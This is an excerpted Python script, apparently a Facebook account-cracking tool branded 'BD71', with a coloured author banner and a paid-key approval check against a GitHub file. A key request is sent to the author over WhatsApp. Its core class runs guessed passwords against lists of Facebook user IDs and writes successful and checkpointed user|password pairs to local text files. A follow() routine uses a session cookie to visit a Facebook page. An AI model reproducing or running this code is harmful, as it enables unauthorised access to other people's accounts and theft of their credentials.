...
def logo():
	print("""%s\033[0;37m
                                   ...
                                   ░╚════╝░╚═╝╚═════╝░░╚════╝░╚═╝░░╚══╝
             \033[1;96m▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
             \033[1;93m▇▇➣    \033[1;91mAUTHOR   : SK JIBON HASAN       \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;94mGITHUB   : Hasan09842          \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;93mFACEBOOK : SK JIBON HASAN      \033[1;93m▇▇
...
def reg():
    ...
    try:
        ...
        reg2()
    r = requests.get('https://github.com/Hasan09842/BD71.txt-/tree/main/approval.txt').text
    if to in r:
        time.sleep(2)
        bsn_menu()
    else:
...
def reg2():
    ...
    input('\033[1;97m               PRESS ENTER  TO SEND TOKEN')
    time.sleep(3.5)
    tks = 'Dear%20CP⁷¹-sir,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+id
    os.system('am start https://wa.me/+8801944408580?text=' + tks)
...
def chigozie():
    ...
    if cookie in['OPEN','Open','open']:
      jalan(""%(O,O));time.sleep(3);os.system('xdg-open https://wa.me/+8801944408580');chigozie()
    try:
...
def bsn_menu():
    ...
    print("             [*]. FACEBOOK   : SK JIBON HASAN");time.sleep (0.03)
    print("             [*]. GITHUB     : HASAN09842");time.sleep (0.03)   
...
class __bsn__:
    ...
    def __api__(self, user, __chi__):
        global ok,cp,loop
        for i in list('\|-/'):
            sys.stdout.write(f'\r [BD⁷¹] {loop}/{len(self.id)} -- OK:- {len(ok)} - CP:- {len(cp)} '),
            sys.stdout.flush()
        for pw in __chi__:
            pw = pw.lower()
            ...
            if "access_token" in p:
                print('\r [OK-CP⁷¹] %s | %s ' % (user,pw))
                wrt = '%s|%s' % (user,pw)
                ok.append(wrt)
                open('BD⁷¹-ok.txt' , 'a').write('%s\n' % wrt)
                break
                ...
                try:
                    ...
                    print('\r%s \033[1;91m[CP-CP⁷¹] %s | %s ' % (K,user,pw))
                    wrt = '%s|%s' % (user,pw)
                    cp.append(wrt)
                    open('BD⁷¹-cp.txt' , 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f'\r [CP⁷¹] {loop}/{len(self.id)} -- OK:- {len(ok)} - CP:- {len(cp)} '),
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
    ...
    def follow(self,session,coki):
        r = BeautifulSoup(session.get("https://mbasic.facebook.com/UPDATE.DARK.CYBER.BD71",cookies={"cookie":coki}).text,"html.parser")
